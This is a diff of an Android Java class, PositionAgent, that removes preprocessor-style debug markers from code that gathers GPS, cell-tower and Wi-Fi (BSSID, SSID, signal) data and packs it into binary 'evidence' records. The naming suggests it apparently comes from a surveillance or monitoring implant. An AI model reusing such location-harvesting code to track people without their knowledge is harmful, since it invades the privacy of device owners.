@@ -82,34 +82,32 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			if (Configuration.GPS_ENABLED) {
 				gpsEnabled = ((type & TYPE_GPS) != 0);
 			} else {
-				// #ifdef DEBUG
+
 				Log.d("QZ", TAG + " Warn: " + "GPS Disabled at compile time");
-				// #endif
+
 			}
 			cellEnabled = ((type & TYPE_CELL) != 0);
 			wifiEnabled = ((type & TYPE_WIFI) != 0);
 
-			// #ifdef DBC
 			Check.asserts(period > 0, "parse period: " + period);
 			// Check.asserts(type == 1 || type == 2 || type == 4, "parse type: "
 			// + type);
-			// #endif
 
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " Info: " + "Type: " + type);
 			Log.d("QZ", TAG + " Info: " + "Period: " + period);
 			Log.d("QZ", TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
 			Log.d("QZ", TAG + " Info: " + "cellEnabled: " + cellEnabled);
 			Log.d("QZ", TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
-			// #endif
+
 
 			setPeriod(period);
 			setDelay(POSITION_DELAY);
 
 		} catch (final IOException e) {
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " Error: " + e.toString());
-			// #endif
+
 			return false;
 		}
 
@@ -125,21 +123,21 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		}
 
 		if (gpsEnabled) {
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " actualRun: gps");
-			// #endif
+
 			locationGPS();
 		}
 		if (cellEnabled) {
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " actualRun: cell");
-			// #endif
+
 			locationCELL();
 		}
 		if (wifiEnabled) {
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " actualRun: wifi");
-			// #endif
+
 			locationWIFI();
 		}
 	}
@@ -151,9 +149,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		WifiInfo wifi = wifiManager.getConnectionInfo();
 
 		if (wifi != null && wifi.getBSSID() != null) {
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " Info: " + "Wifi: " + wifi.getBSSID());
-			// #endif
+
 			final byte[] payload = getWifiPayload(wifi.getBSSID(),
 					wifi.getSSID(), wifi.getRssi());
 
@@ -165,9 +163,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			// logWifi.writeEvidence(payload);
 			// logWifi.close();
 		} else {
-			// #ifdef DEBUG
+
 			Log.d("QZ", TAG + " Warn: " + "Wifi disabled");
-			// #endif
+
 		}
 
 	}
@@ -208,17 +206,15 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			return;
 		}
 
-		// #ifdef DEBUG
 		Log.d("QZ", TAG + " newLocation");
-		// #endif
+
 
 		byte[] payload;
 		synchronized (this) {
 			final long timestamp = lastLocation.getTime();
 
-			// #ifdef DEBUG
 			Log.d("QZ", TAG + " valid");
-			// #endif
+
 			payload = getGPSPayload(lastLocation, timestamp);
 			lastLocation = null;
 		}
@@ -275,23 +271,20 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		addbuffer.writeInt(type);
 		addbuffer.writeInt(structNum);
 
-		// #ifdef DBC
 		Check.ensures(addbuffer.getPosition() == addsize,
 				"addbuffer wrong size");
-		// #endif
+
 
 		return additionalData;
 	}
 
 	private byte[] messageEvidence(byte[] payload, int type) {
 
-		// #ifdef DBC
 		Check.requires(payload != null, "saveEvidence payload!= null");
-		// #endif
 
-		// #ifdef DEBUG
+
 		Log.d("QZ", TAG + " saveEvidence payload: " + payload.length);
-		// #endif
+
 
 		final int version = 2008121901;
 		final Date date = new Date();
@@ -315,10 +308,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		// delimiter
 		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);
 
-		// #ifdef DBC
 		Check.ensures(databuffer.getPosition() == size,
 				"saveEvidence wrong size");
-		// #endif
+
 
 		// save log
 
@@ -336,14 +328,13 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		for (int i = 0; i < 6; i++) {
 			final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
-			// #ifdef DEBUG
+
 			// debug.trace("getWifiPayload " + i + " : "
 			// + Utils.byteArrayToHex(token));
-			// #endif
 
-			// #ifdef DBC
+
 			Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
-			// #endif
+
 			databuffer.writeByte(token[0]);
 		}
 
@@ -359,23 +350,20 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			place[i] = ssidcontent[i];
 		}
 
-		// #ifdef DEBUG
 		Log.d("QZ", TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
-		// #endif
+
 		databuffer.writeInt(ssidcontent.length);
 
 		databuffer.write(place);
 
 		databuffer.writeInt(signalLevel);
 
-		// #ifdef DBC
 		Check.ensures(databuffer.getPosition() == size,
 				"databuffer.getPosition wrong size");
-		// #endif
 
-		// #ifdef DBC
+
 		Check.ensures(payload.length == size, "payload wrong size");
-		// #endif
+
 
 		return payload;
 	}
@@ -417,10 +405,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // BCCH
 		databuffer.write(new byte[16]); // NMR
 
-		// #ifdef DBC
 		Check.ensures(databuffer.getPosition() == size,
 				"getCellPayload wrong size");
-		// #endif
+
 
 		return messageEvidence(cellPosition, logType);
 
@@ -430,9 +417,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	 * @param timestamp
 	 */
 	private byte[] getGPSPayload(Location loc, long timestamp) {
-		// #ifdef DEBUG
+
 		Log.d("QZ", TAG + " getGPSPayload");
-		// #endif
+
 		final Date date = new Date(timestamp);
 
 		final double latitude = loc.getLatitude();
@@ -500,14 +487,12 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		databuffer.write(new byte[48]); // azimuth view
 		databuffer.write(new byte[48]); // sn view
 
-		// #ifdef DEBUG
 		Log.d("QZ", TAG + " len: " + databuffer.getPosition());
-		// #endif
 
-		// #ifdef DBC
+
 		Check.ensures(databuffer.getPosition() == size,
 				"saveGPSLog wrong size: " + databuffer.getPosition());
-		// #endif
+
 
 		return messageEvidence(gpsPosition, LOG_TYPE_GPS);
 
